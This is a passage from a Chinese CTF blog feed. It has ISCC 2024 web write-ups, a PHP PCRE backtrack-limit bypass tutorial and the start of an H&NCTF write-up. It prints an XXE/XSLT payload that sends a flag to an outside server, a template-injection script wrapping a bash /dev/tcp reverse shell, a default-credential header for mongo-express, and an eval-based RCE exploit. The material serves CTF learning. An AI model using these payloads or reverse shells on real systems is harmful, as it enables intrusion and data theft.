class="hljs-string">&lt;!DOCTYPE a [</span><br><span class="hljs-string">   &lt;!ENTITY xxe SYSTEM  &quot;http://101.200.138.180:30280/flag&quot; &gt;]&gt;</span><br><span class="hljs-string">&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; version=&quot;1.0&quot;&gt;</span><br><span class="hljs-string">  &lt;xsl:template match=&quot;/asdf&quot;&gt;</span><br><span class="hljs-string">    &lt;HTML&gt;</span><br><span class="hljs-string">      &lt;HEAD&gt;</span><br><span class="hljs-string">        &lt;TITLE&gt;&lt;/TITLE&gt;</span><br><span class="hljs-string">      &lt;/HEAD&gt;</span><br><span class="hljs-string">      &lt;BODY&gt;</span><br><span class="hljs-string">        &lt;img&gt;</span><br><span class="hljs-string">          &lt;xsl:attribute name=&quot;src&quot;&gt;</span><br><span class="hljs-string">            http://这边填服务器和端口/?&amp;xxe;</span><br><span class="hljs-string">          &lt;/xsl:attribute&gt;</span><br><span class="hljs-string">        &lt;/img&gt;</span><br><span class="hljs-string">      &lt;/BODY&gt;</span><br><span class="hljs-string">    &lt;/HTML&gt;</span><br><span class="hljs-string">  &lt;/xsl:template&gt;</span><br><span class="hljs-string">&lt;/xsl:stylesheet&gt;`</span><br><br>xml = <span class="hljs-string">`&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-string">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;data:text/plain;base64,<span class="hljs-subst">$&#123;btoa(xmls)&#125;</span>&quot;?&gt;</span><br><span class="hljs-string">&lt;asdf&gt;&lt;/asdf&gt;`</span><br>xss = <span class="hljs-built_in">encodeURIComponent</span>(xml)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(xss)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/xss.png" alt="xss"></p><p>然后拼接脚本就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://101.200.138.180:30280/adminbot?url=http://101.200.138.180:30280/?payload=%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%3Fxml-stylesheet%20type%3D%22text%2F<br>xsl%22%20href%3D%22data%3Atext%2Fplain%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIj8%2B<br>CjwhRE9DVFlQRSBhIFsKICAgPCFFTlRJVFkgeHhlIFNZU1RFTSAgImh0dHA6Ly8xMDEuMjAwLjEzOC4x<br>ODA6MzAyODAvZmxhZyIgPl0%2BCjx4c2w6c3R5bGVzaGVldCB4bWxuczp4c2w9Imh0dHA6Ly93d3cudz<br>Mub3JnLzE5OTkvWFNML1RyYW5zZm9ybSIgdmVyc2lvbj0iMS4wIj4KICA8eHNsOnRlbXBsYXRlIG1hdG<br>NoPSIvYXNkZiI%2BCiAgICA8SFRNTD4KICAgICAgPEhFQUQ%2BCiAgICAgICAgPFRJVExFPjwvVElUTE<br>U%2BCiAgICAgIDwvSEVBRD4KICAgICAgPEJPRFk%2BCiAgICAgICAgPGltZz4KICAgICAgICAgIDx4c2<br>w6YXR0cmlidXRlIG5hbWU9InNyYyI%2BCiAgICAgICAgICAgIGh0dHA6Ly80Ny4xMjIuMjIuMTY6ODA4<br>MC8%2FJnh4ZTsKICAgICAgICAgIDwveHNsOmF0dHJpYnV0ZT4KICAgICAgICA8L2ltZz4KICAgICAgPC<br>9CT0RZPgogICAgPC9IVE1MPgogIDwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg%3D%3D%2<br>2%3F%3E%0A%3Casdf%3E%3C%2Fasdf%3E<br><br></code></pre></td></tr></table></figure><p>多尝试几次理论上火狐也是可以传的我试过了</p><p><img src="/../../images/iscc2024/xss1.png" alt="xss1"></p><h3 id="回来吧永远滴神"><a class="markdownIt-Anchor" href="#回来吧永远滴神"></a> 回来吧永远滴神</h3><p>呜呜呜，我再也不看英雄联盟了。</p><p>首先的界面是需要填空的，搜索一下</p><p><img src="/../../images/iscc2024/yyds.png" alt="yyds"></p><p>填空就行，然后进入一个页面</p><p><img src="/../../images/iscc2024/yyds1.png" alt="yyds1"></p><p>好像是模板注入，看不了源码，view-source也看不了，用bp抓一下内容</p><p><img src="/../../images/iscc2024/yyds2.png" alt="yyds2"></p><p>整数这块有点问题噢，后面还有等于，赛博厨子一把梭,先base64再转hex得到</p><p><img src="/../../images/iscc2024/yyds3.png" alt="yyds3"></p><p>通过分析flag应该是拼接的内容，我们再看看原来的，尝试模板注入看看</p><p><img src="/../../images/iscc2024/yyds4.png" alt="yyds4"></p><p>有内容的，那就尝试写个脚本看看吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> functools<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload<br><br>url = <span class="hljs-string">&quot;http://101.200.138.180:16356/evlelLL/646979696775616e&quot;</span><br>cookies = &#123;<br>    <span class="hljs-string">&#x27;session&#x27;</span>: <span class="hljs-string">&#x27;eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.Zk7ADA.GKdiBAKEeHRKoMPRWoSoRkaaH2c&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@functools.lru_cache(<span class="hljs-params">maxsize=<span class="hljs-number">1000</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">payload: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;检查字符串是否能通过WAF。如果能通过，返回True；否则返回False。&quot;&quot;&quot;</span><br>    time.sleep(<span class="hljs-number">0.02</span>)  <span class="hljs-comment"># 防止请求发送过多</span><br>    <span class="hljs-keyword">try</span>:<br>        resp = requests.post(url, cookies=cookies, timeout=<span class="hljs-number">10</span>, data=&#123;<span class="hljs-string">&quot;iIsGod&quot;</span>: payload&#125;)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;大胆&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text<br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求异常: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    shell_payload, will_print = exec_cmd_payload(<br>        waf, <span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/服务器/端口 0&gt;&amp;1&quot;&#x27;</span><br>    )<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> will_print:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这个payload不会产生回显！&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;shell_payload=&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>也是概率性的事情</p><p><img src="/../../images/iscc2024/yyds5.png" alt="yyds5"></p><p>讲改内容输入到页面的内容，反弹shell</p><p><img src="/../../images/iscc2024/yyds6.png" alt="yyds6"></p><p>还有一部分的内容估计就在app.py里面了，是个很长内容的代码</p><p><img src="/../../images/iscc2024/yyds7.png" alt="yyds7"></p><p>具体定位到key和偏移值和密文，写个脚本得到答案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python">![yyds8](../../images/iscc2024/yyds8.png)<span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long <span class="hljs-keyword">as</span> b2l, long_to_bytes <span class="hljs-keyword">as</span> l2b<br><span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> Enum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mode</span>(<span class="hljs-title class_ inherited__">Enum</span>):<br>    ECB = <span class="hljs-number">0x01</span><br>    CBC = <span class="hljs-number">0x02</span><br>    CFB = <span class="hljs-number">0x03</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cipher</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key, iv=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-variable language_">self</span>.BLOCK_SIZE = <span class="hljs-number">64</span>  <span class="hljs-comment"># Block size in bits</span><br>        <span class="hljs-variable language_">self</span>.KEY = [b2l(key[i:i + <span class="hljs-variable language_">self</span>.BLOCK_SIZE // <span class="hljs-number">16</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key), <span class="hljs-variable language_">self</span>.BLOCK_SIZE // <span class="hljs-number">16</span>)]<br>        <span class="hljs-variable language_">self</span>.DELTA = <span class="hljs-number">0x9e3779b9</span><br>        <span class="hljs-variable language_">self</span>.IV = iv<br>        <span class="hljs-variable language_">self</span>.ROUNDS = <span class="hljs-number">64</span><br>        <span class="hljs-variable language_">self</span>.mode = <span class="hljs-variable language_">self</span>._determine_mode(iv)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_determine_mode</span>(<span class="hljs-params">self, iv</span>):<br>        <span class="hljs-keyword">if</span> iv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> Mode.ECB<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(iv) * <span class="hljs-number">8</span> == <span class="hljs-variable language_">self</span>.BLOCK_SIZE:<br>            <span class="hljs-keyword">return</span> Mode.CBC<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> Mode.CFB<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_xor</span>(<span class="hljs-params">self, a, b</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(_a ^ _b <span class="hljs-keyword">for</span> _a, _b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_block</span>(<span class="hljs-params">self, block</span>):<br>        mask = (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-variable language_">self</span>.BLOCK_SIZE // <span class="hljs-number">2</span>)) - <span class="hljs-number">1</span><br>        c0 = b2l(block[:<span class="hljs-number">4</span>])<br>        c1 = b2l(block[<span class="hljs-number">4</span>:])<br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-variable language_">self</span>.DELTA * <span class="hljs-variable language_">self</span>.ROUNDS) &amp; mask<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.ROUNDS):<br>            c1 -= ((c0 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-variable language_">self</span>.KEY[(<span class="hljs-variable language_">self</span>.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">2</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)]) ^ (c0 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (c0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-variable language_">self</span>.KEY[(<span class="hljs-variable language_">self</span>.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">3</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)])<br>            c1 &amp;= mask<br>            c0 -= ((c1 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-variable language_">self</span>.KEY[(<span class="hljs-variable language_">self</span>.ROUNDS - i - <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)]) ^ (c1 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (c1 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-variable language_">self</span>.KEY[(<span class="hljs-variable language_">self</span>.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)])<br>            c0 &amp;= mask<br>            <span class="hljs-built_in">sum</span> -= <span class="hljs-variable language_">self</span>.DELTA<br><br>        <span class="hljs-keyword">return</span> l2b((c0 &lt;&lt; (<span class="hljs-variable language_">self</span>.BLOCK_SIZE // <span class="hljs-number">2</span>)) | c1)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_encrypt_block</span>(<span class="hljs-params">self, block</span>):<br>        m0 = b2l(block[:<span class="hljs-number">4</span>])<br>        m1 = b2l(block[<span class="hljs-number">4</span>:])<br>        mask = (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-variable language_">self</span>.BLOCK_SIZE // <span class="hljs-number">2</span>)) - <span class="hljs-number">1</span><br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.ROUNDS):<br>            <span class="hljs-built_in">sum</span> += <span class="hljs-variable language_">self</span>.DELTA<br>            m0 += ((m1 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-variable language_">self</span>.KEY[i % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)]) ^ (m1 + <span class="hljs-built_in">sum</span>) ^ ((m1 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-variable language_">self</span>.KEY[(i + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)])<br>            m0 &amp;= mask<br>            m1 += ((m0 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-variable language_">self</span>.KEY[(i + <span class="hljs-number">2</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)]) ^ (m0 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (m0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-variable language_">self</span>.KEY[(i + <span class="hljs-number">3</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)])<br>            m1 &amp;= mask<br><br>        <span class="hljs-keyword">return</span> l2b((m0 &lt;&lt; (<span class="hljs-variable language_">self</span>.BLOCK_SIZE // <span class="hljs-number">2</span>)) | m1)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_ecb</span>(<span class="hljs-params">self, blocks</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;&#x27;</span>.join(<span class="hljs-variable language_">self</span>._decrypt_block(block) <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_cbc</span>(<span class="hljs-params">self, blocks</span>):<br>        plaintext = <span class="hljs-string">b&#x27;&#x27;</span><br>        prev_block = <span class="hljs-variable language_">self</span>.IV<br>        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>            decrypted_block = <span class="hljs-variable language_">self</span>._decrypt_block(block)<br>            plaintext_block = <span class="hljs-variable language_">self</span>._xor(prev_block, decrypted_block)<br>            plaintext += plaintext_block<br>            prev_block = block<br>        <span class="hljs-keyword">return</span> plaintext<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_cfb</span>(<span class="hljs-params">self, blocks</span>):<br>        plaintext = <span class="hljs-string">b&#x27;&#x27;</span><br>        prev_block = <span class="hljs-variable language_">self</span>.IV<br>        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>            output = <span class="hljs-variable language_">self</span>._encrypt_block(prev_block)<br>            plaintext_block = <span class="hljs-variable language_">self</span>._xor(output, block)<br>            plaintext += plaintext_block<br>            prev_block = block<br>        <span class="hljs-keyword">return</span> plaintext<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self, ciphertext</span>):<br>        block_size_bytes = <span class="hljs-variable language_">self</span>.BLOCK_SIZE // <span class="hljs-number">8</span><br>        blocks = [ciphertext[i:i + block_size_bytes] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ciphertext), block_size_bytes)]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.mode == Mode.ECB:<br>            plaintext = <span class="hljs-variable language_">self</span>._decrypt_ecb(blocks)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-variable language_">self</span>.mode == Mode.CBC:<br>            plaintext = <span class="hljs-variable language_">self</span>._decrypt_cbc(blocks)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/yyds8.png" alt="yyds8"></p><p>一共得到四个部分拼接起来看看可能是栅栏，我们用在线枚举得到答案</p><p><img src="/../../images/iscc2024/yyds9.png" alt="yyds9"></p><h3 id="实战阶段一"><a class="markdownIt-Anchor" href="#实战阶段一"></a> 实战阶段一</h3><p>这个cve漏洞完全跟着网上一篇文章来就可以成功了，，也说一下</p><p><a href="https://www.cnblogs.com/arrest/articles/17529877.html">文章</a>，跟着来就行了</p><p><img src="/../../images/iscc2024/%E5%AE%9E%E6%88%98.png" alt="实战"></p><p>先尝试看看flag里面有没有内容，然后注意到了cve漏洞，去具体搜索一下看看</p><p>mongo-express是一款mongodb的第三方Web界面，使用node和express开发。如果攻击者可以成功登<br>录，或者目标服务器没有修改默认的账号密码（ admin:pass ），则可以执行任意node.js代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Authorization: Basic YWRtaW46cGFzcw==<br></code></pre></td></tr></table></figure><p>改个success+账户名就行</p><p><img src="/../../images/iscc2024/%E5%AE%9E%E6%88%981.png" alt="实战1"></p><p>总结：虽然是炒冷饭，还是记录一下吧，没什么好说的，人民的好比赛。（劳累.jpg</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>复盘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP利用PCRE回溯次数限制绕过</title>
    <link href="/2024/05/14/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/"/>
    <url>/2024/05/14/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>刷题碰到了这种题目，记录一下知识点。</p><p>首先可以拜读一下p神的文章，还是很有收获的。</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=2#reply-list">文章</a></p><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>然后我也简要的说一下吧。</p><p>常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是</p><ul><li><p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。</p></li><li><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p></li></ul><p>就以p神举的例子，我们正则&lt;?.*[(`;?&gt;].*,然后输入&lt;?php phpinfo();//aaaaa这个内容</p><p>由于有.*这个正则，可以匹配任何字符，进行贪婪模式，匹配到.*时，会把php phpinfo();//aaaaa所有进行匹配，但是应该不对后面应该还有一个字符[(`;?&gt;]（这是一个字符集匹配其中任意一个，所有我们会进行回溯，吐出a,最终直道吐出；然后可以进行匹配。这个结果满足正则表达式的要求，于是不再回溯。最后的.*匹配的//aaaaa，完成正则。</p><h2 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h2><p>preg_match本身回身回溯超过1000000会返回false绕过，我们可以构造脚本进行绕过。</p><h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2><p>是先看到的题目，然后才开始找知识点的。<a href="https://www.nssctf.cn/problem/1897">NISACTF 2022middlerce</a>。</p><p>先看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>include &quot;check.php&quot;;<br>if (isset($_REQUEST[&#x27;letter&#x27;]))&#123;<br>    $txw4ever = $_REQUEST[&#x27;letter&#x27;];<br>    if (preg_match(&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;,$txw4ever))&#123;<br>        die(&quot;再加把油喔&quot;);<br>    &#125;<br>    else&#123;<br>        $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;];<br>        checkdata($command);<br>        @eval($command);<br>    &#125;<br>&#125;<br>else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>我们只分析这篇的知识点，和上面讲的差不多，cmd绕过后eval进行读取</p><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>payload=<span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;@&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br><span class="hljs-comment">#传的letter,构造payload里面的内容，?&gt;是绕过checkdata,然后js选择cmd里的内容执行代码输出</span><br>res = requests.post(<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28304/&quot;</span>, data=&#123;<span class="hljs-string">&quot;letter&quot;</span>:payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="感受"><a class="markdownIt-Anchor" href="#感受"></a> 感受：</h2><p>小白学到知识还是感受良多的，之后如果遇到类似的题目也会继续加在这里。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>H&amp;NCTF</title>
    <link href="/2024/05/13/H&amp;NCTF%202024/"/>
    <url>/2024/05/13/H&amp;NCTF%202024/</url>
    
    <content type="html"><![CDATA[<p>前言：比赛也没怎么打，就看了看，自己会的还是太少了，等师傅们发完wp想看看复现一遍的，先写写记录一下知识。</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="please_rce_me"><a class="markdownIt-Anchor" href="#please_rce_me"></a> Please_RCE_Me</h2><p>***知识点:***rce绕过-编码绕过</p><p>先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;moran&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>];<br>        <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="hljs-variable">$str1</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="hljs-variable">$str2</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;<br>&#125; 